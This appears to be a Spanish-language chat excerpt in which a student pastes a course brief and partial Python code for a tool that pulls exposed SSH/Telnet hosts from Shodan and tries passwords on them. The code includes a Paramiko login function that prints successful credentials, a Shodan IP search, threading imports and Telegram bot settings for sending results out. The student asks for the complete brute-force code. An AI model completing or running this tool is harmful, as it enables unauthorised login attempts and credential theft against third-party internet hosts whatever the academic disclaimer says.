se adunta el pdf y se escribe

```
"GUÍA SSH - Telnet Script con IA (individual)
Actividad: Desarrollo de una aplicación en Python para validación de credenciales SSH y Telnet usando Shodan API

Introducción
Esta aplicación tiene exclusivamente fines académicos y educativos. Su uso debe ser responsable, ético y legal, enfatizando la responsabilidad del estudiante ante cualquier uso indebido.

Descripción General
Los estudiantes deberán desarrollar una aplicación en Python para realizar auditorías y validaciones de credenciales SSH y Telnet utilizando Shodan API, en el contexto específico de seguridad informática aplicada.

Objetivos de Aprendizaje
• Desarrollar habilidades prácticas en Python enfocado en seguridad informática.
• Integrar APIs de terceros (Shodan) para descubrir servicios expuestos.
• Automatizar pruebas de conexión y validación mediante SSH y Telnet.
• Evaluar y gestionar aspectos éticos y legales del uso de herramientas de auditoría en ciberseguridad."
```

"si dime mas func avanzadas o interasnates, enviar por telegram y generar reportes "
```
SSH (Paramiko):

import paramiko

def check_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=5)
        print(f"Acceso exitoso: {ip} - {username}:{password}")
        client.close()
    except Exception as e:
        print(f"Fallo en {ip}: {e}")
```
"y esto que hace o como lo implemento"

"dame entonces el codigo completo de check_ssh segun esto:"
```
import shodan
import paramiko
import telnetlib
import requests
import csv
from concurrent.futures import ThreadPoolExecutor

# Funcionalidad Básica - Buscar IPs expuestas en Shodan

API_KEY = "XXXXXXXXXXXXXX"
TELEGRAM_BOT_TOKEN = "XXXXXXXXXXXXXX"
TELEGRAM_CHAT_ID = "XXXXXXXXXXXXXX"


def search_shodan(query):
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        result = api.search(query)
        return [service['ip_str'] for service in result['matches']]
    except Exception as e:
        print(f"Error en Shodan: {e}")
        return []


# Funcionalidad Avanzada - Automatizar intentos de autenticación
# SSH (Paramiko):"
```
